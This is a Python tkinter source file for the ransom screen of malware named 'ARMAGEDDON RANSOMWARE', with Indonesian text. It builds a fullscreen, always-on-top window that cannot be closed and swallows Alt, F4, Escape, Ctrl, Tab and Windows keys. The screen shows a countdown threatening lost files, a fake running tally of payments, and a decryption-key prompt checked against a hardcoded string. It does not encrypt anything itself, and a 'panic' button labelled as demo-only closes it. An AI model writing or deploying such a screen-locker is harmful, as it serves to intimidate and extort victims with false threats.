import tkinter as tk
from tkinter import scrolledtext
import threading
import time
import random
import sys
import os
import ctypes
import platform

class mainwindow(tk.Tk):
    def __init__(self, message):
        super().__init__()
        
        # Make window fullscreen and topmost
        self.attributes('-fullscreen', True)
        self.attributes('-topmost', True)
        self.configure(bg='black')
        
        # Disable close button
        self.protocol("WM_DELETE_WINDOW", self.disable_event)
        
        # Block Alt+F4 and other shortcuts
        self.bind_all('<Key>', self.block_keys)
        
        self.message = message
        self.title("ARMAGEDDON RANSOMWARE")
        
        # Create main frame
        self.main_frame = tk.Frame(self, bg='black')
        self.main_frame.pack(expand=True, fill='both', padx=50, pady=50)
        
        # Warning header
        self.header = tk.Label(
            self.main_frame,
            text="ARMAGEDDON RANSOMWARE",
            font=("Courier", 24, "bold"),
            fg='red',
            bg='black'
        )
        self.header.pack(pady=20)
        
        # Animation area
        self.animation_frame = tk.Frame(self.main_frame, bg='black', height=100)
        self.animation_frame.pack(fill='x', pady=10)
        
        self.animation_label = tk.Label(
            self.animation_frame,
            text=self.get_skull_animation(),
            font=("Courier", 12),
            fg='red',
            bg='black'
        )
        self.animation_label.pack()
        
        # Countdown timer
        self.timer_frame = tk.Frame(self.main_frame, bg='black')
        self.timer_frame.pack(pady=10)
        
        self.timer_label = tk.Label(
            self.timer_frame,
            text=" WAKTER: 47:59:59 ",
            font=("Courier", 18, "bold"),
            fg='yellow',
            bg='black'
        )
        self.timer_label.pack()
        
        # Message area
        self.message_frame = tk.Frame(self.main_frame, bg='black')
        self.message_frame.pack(expand=True, fill='both', pady=20)
        
        self.text_area = scrolledtext.ScrolledText(
            self.message_frame,
            wrap=tk.WORD,
            width=80,
            height=15,
            font=("Courier", 11),
            bg='#1a1a1a',
            fg='#00ff00',
            insertbackground='red'
        )
        self.text_area.pack(expand=True, fill='both')
        self.text_area.insert('1.0', message)
        self.text_area.config(state='disabled')
        
        # Input frame
        self.input_frame = tk.Frame(self.main_frame, bg='black')
        self.input_frame.pack(fill='x', pady=10)
        
        # Key input
        self.key_label = tk.Label(
            self.input_frame,
            text="MASUKKAN KUNCI DEKRIPSI:",
            font=("Courier", 12),
            fg='red',
            bg='black'
        )
        self.key_label.pack()
        
        self.key_entry = tk.Entry(
            self.input_frame,
            show="*",
            font=("Courier", 14),
            width=50,
            bg='#333333',
            fg='white',
            insertbackground='white'
        )
        self.key_entry.pack(pady=5)
        self.key_entry.bind('<Return>', self.check_key)
        
        # Buttons
        self.button_frame = tk.Frame(self.main_frame, bg='black')
        self.button_frame.pack(pady=10)
        
        self.decrypt_button = tk.Button(
            self.button_frame,
            text=" DEKRIP FILE ",
            command=self.check_key,
            font=("Courier", 12, "bold"),
            bg='red',
            fg='black',
            activebackground='darkred',
            activeforeground='white',
            padx=20,
            pady=10
        )
        self.decrypt_button.pack(side='left', padx=10)
        
        self.panic_button = tk.Button(
            self.button_frame,
            text=" PANIC BUTTON ",
            command=self.panic,
            font=("Courier", 12, "bold"),
            bg='yellow',
            fg='black',
            activebackground='orange',
            activeforeground='black',
            padx=20,
            pady=10
        )
        self.panic_button.pack(side='left', padx=10)
        
        # Status bar
        self.status_bar = tk.Label(
            self.main_frame,
            text="💢 STATUS: MENUNGGU PEMBAYARAN - 0/5 JUTA 💢",
            font=("Courier", 10),
            fg='red',
            bg='black',
            bd=1,
            relief=tk.SUNKEN
        )
        self.status_bar.pack(fill='x', pady=5)
        
        # Start animations
        self.start_animations()
        
    def get_skull_animation(self):
        """Get ASCII skull animation"""
        skulls = [
            "💀       💀       💀",
            "  💀     💀     💀",
            "    💀   💀   💀",
            "      💀 💀 💀",
            "        💀💀💀",
            "         💀💀",
            "          💀",
            "         💀💀",
            "        💀💀💀",
            "      💀 💀 💀",
            "    💀   💀   💀",
            "  💀     💀     💀",
            "💀       💀       💀"
        ]
        return random.choice(skulls)
    
    def start_animations(self):
        """Start all animations"""
        self.update_skull()
        self.update_timer()
        self.update_status()
    
    def update_skull(self):
        """Update skull animation"""
        self.animation_label.config(text=self.get_skull_animation())
        self.after(200, self.update_skull)
    
    def update_timer(self):
        """Update countdown timer"""
        try:
            current = self.timer_label.cget("text")
            # Parse current time
            if "WAKTER:" in current:
                time_str = current.split("WAKTER:")[1].split("⏰")[0].strip()
                h, m, s = map(int, time_str.split(':'))
                total_seconds = h * 3600 + m * 60 + s - 1
                
                if total_seconds <= 0:
                    self.timer_label.config(
                        text=" WAKTU HABIS! FILE ANDA HILANG! ",
                        fg='red'
                    )
                else:
                    h = total_seconds // 3600
                    m = (total_seconds % 3600) // 60
                    s = total_seconds % 60
                    self.timer_label.config(
                        text=f" WAKTER: {h:02d}:{m:02d}:{s:02d} "
                    )
        except:
            pass
        
        self.after(1000, self.update_timer)
    
    def update_status(self):
        """Update status bar"""
        payments = random.randint(0, 5000000)
        self.status_bar.config(
            text=f" STATUS: PEMBAYARAN TERKUMPUL - Rp {payments:,}/5,000,000 "
        )
        self.after(3000, self.update_status)
    
    def block_keys(self, event):
        """Block specific keys"""
        blocked = [
            'Alt_L', 'Alt_R', 'F4', 'Control_L', 'Control_R',
            'Escape', 'Tab', 'Win_L', 'Win_R'
        ]
        if event.keysym in blocked:
            return "break"
    
    def disable_event(self):
        """Disable window closing"""
        pass
    
    def check_key(self, event=None):
        """Check if decryption key is correct"""
        key = self.key_entry.get()
        
        # This is just a placeholder - real key check would happen here
        if key == "ARMAGEDDON-RELEASE-KEY":
            self.text_area.config(state='normal')
            self.text_area.delete('1.0', tk.END)
            self.text_area.insert('1.0', "KEY VALID! MULAI DEKRIPSI...\n\n" + self.message)
            self.text_area.config(state='disabled')
        else:
            self.flash_error()
    
    def flash_error(self):
        """Flash error message"""
        original_bg = self.key_entry.cget('bg')
        self.key_entry.config(bg='red')
        self.after(200, lambda: self.key_entry.config(bg=original_bg))
    
    def panic(self):
        """Panic button - for demo only"""
        self.text_area.config(state='normal')
        self.text_area.insert(tk.END, "\n\n PANIC MODE AKTIF! MENGIRIM SINYAL DARURAT... \n")
        self.text_area.config(state='disabled')
        self.after(2000, self.destroy)

if __name__ == "__main__":
    # Test message
    test_message = "Ini adalah pesan test untuk Armageddon Ransomware"
    app = mainwindow(test_message)
    app.mainloop()
